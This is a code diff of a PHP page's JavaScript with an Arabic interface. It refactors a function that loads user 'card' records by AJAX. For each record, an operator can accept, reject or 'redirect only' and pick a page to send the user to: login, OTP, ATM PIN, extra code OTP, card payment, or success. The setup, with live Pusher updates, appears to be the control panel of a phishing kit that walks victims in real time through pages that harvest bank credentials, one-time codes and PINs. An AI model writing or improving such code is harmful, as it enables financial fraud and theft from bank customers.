@@ -565,61 +565,109 @@ if (isset($_POST['deleteAllUser'])) {
     <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
 
     <script>
-        function removeBackground(button, userId) {
-            var row = button.closest('tr');
-            row.classList.remove('bg-dangl');
+       function removeBackground(button, userId) {
 
-            $.ajax({
-                url: 'user-id.php',
-                type: 'GET',
-                data: { user_id: userId },
-                success: function (response) {
-                  let cards;
+    var row = button.closest('tr');
+    row.classList.remove('bg-dangl');
 
-try {
-    cards = JSON.parse(response);
-} catch (e) {
-    console.log("❌ INVALID JSON RESPONSE:", response);
-    return;
-}
-                    var cardContainer = $('#cardDetails' + userId);
-                    cardContainer.empty();
+    $.ajax({
+        url: 'user-id.php',
+        type: 'GET',
+        data: { user_id: userId },
+        dataType: 'json',
 
-                    cards.forEach(function (card) {
-                        var cardHtml = `
-                            ${card.status == 1 ? `
-                                <div class="alert alert-success fw-bold text-center py-2 mb-3"><i class="bi bi-check-circle-fill me-2"></i> تم القبول مسبقاً</div>
-                            ` : card.status == 2 ? `
-                                <div class="alert alert-danger fw-bold text-center py-2 mb-3"><i class="bi bi-x-circle-fill me-2"></i> تم الرفض مسبقاً</div>
-                            ` : ''}
-                            <div class="mb-4">
-                                <label class="form-label text-muted fw-bold mb-2">اختر مسار التوجيه:</label>
-                                <select class="form-select mb-3" id="selUrl${card.id}">
-                                    <option value="login.php" selected>صفحة تسجيل الدخول (Login)</option>
-                                    <option value="otp.php">صفحة رمز التحقق (OTP)</option>
-                                    <option value="password.php">صفحة الرقم السري للبطاقة (ATM PIN)</option>
-                                    <option value="code-otp.php">التحقق الإضافي (Code OTP)</option>
-                                    <option value="payment.php">صفحة الدفع بالبطاقة (Payment)</option>
-                                    <option value="index.php?done=1">صفحة القبول النهائي (Success)</option>
-                                </select>
-                                <div class="d-flex flex-wrap gap-2">
-                                    <button onclick="callRequest(${card.id}, 1)" class="btn btn-success flex-fill fw-bold py-2"><i class="bi bi-check-circle me-1"></i> قبول وتوجيه</button>
-                                    <button onclick="callRequest(${card.id}, 0)" class="btn btn-warning flex-fill fw-bold py-2 text-dark"><i class="bi bi-arrow-right-circle me-1"></i> توجيه فقط</button>
-                                    <button onclick="callRequest(${card.id}, 2)" class="btn btn-danger flex-fill fw-bold py-2"><i class="bi bi-x-circle me-1"></i> رفض وتوجيه</button>
-                                </div>
-                            </div>
-                        `;
-                        cardContainer.append(cardHtml);
-                    });
+        success: function (cards) {
 
-                    var modal = new bootstrap.Modal(document.getElementById('card' + userId));
-modal.show();
-                },
-                error: function (xhr, status, error) {
-                    console.error('Request failed:', status, error);
-                }
+            var cardContainer = $('#cardDetails' + userId);
+            cardContainer.empty();
+
+            cards.forEach(function (card) {
+
+                var cardHtml = `
+                    ${card.status == 1 ? `
+                        <div class="alert alert-success fw-bold text-center py-2 mb-3">
+                            <i class="bi bi-check-circle-fill me-2"></i>
+                            تم القبول مسبقاً
+                        </div>
+                    ` : card.status == 2 ? `
+                        <div class="alert alert-danger fw-bold text-center py-2 mb-3">
+                            <i class="bi bi-x-circle-fill me-2"></i>
+                            تم الرفض مسبقاً
+                        </div>
+                    ` : ''}
+
+                    <div class="mb-4">
+
+                        <label class="form-label text-muted fw-bold mb-2">
+                            اختر مسار التوجيه:
+                        </label>
+
+                        <select class="form-select mb-3" id="selUrl${card.id}">
+                            <option value="login.php" selected>
+                                صفحة تسجيل الدخول (Login)
+                            </option>
+
+                            <option value="otp.php">
+                                صفحة رمز التحقق (OTP)
+                            </option>
+
+                            <option value="password.php">
+                                صفحة الرقم السري للبطاقة (ATM PIN)
+                            </option>
+
+                            <option value="code-otp.php">
+                                التحقق الإضافي (Code OTP)
+                            </option>
+
+                            <option value="payment.php">
+                                صفحة الدفع بالبطاقة (Payment)
+                            </option>
+
+                            <option value="index.php?done=1">
+                                صفحة القبول النهائي (Success)
+                            </option>
+                        </select>
+
+                        <div class="d-flex flex-wrap gap-2">
+
+                            <button onclick="callRequest(${card.id}, 1)"
+                                class="btn btn-success flex-fill fw-bold py-2">
+                                <i class="bi bi-check-circle me-1"></i>
+                                قبول وتوجيه
+                            </button>
+
+                            <button onclick="callRequest(${card.id}, 0)"
+                                class="btn btn-warning flex-fill fw-bold py-2 text-dark">
+                                <i class="bi bi-arrow-right-circle me-1"></i>
+                                توجيه فقط
+                            </button>
+
+                            <button onclick="callRequest(${card.id}, 2)"
+                                class="btn btn-danger flex-fill fw-bold py-2">
+                                <i class="bi bi-x-circle me-1"></i>
+                                رفض وتوجيه
+                            </button>
+
+                        </div>
+                    </div>
+                `;
+
+                cardContainer.append(cardHtml);
             });
+
+            var modal = new bootstrap.Modal(
+                document.getElementById('card' + userId)
+            );
+
+            modal.show();
+        },
+
+        error: function (xhr, status, error) {
+            console.error('Request failed:', status, error);
         }
+    });
+}
+
 
         function callRequest(id, status) {
             var selectElement = document.getElementById('selUrl' + id);
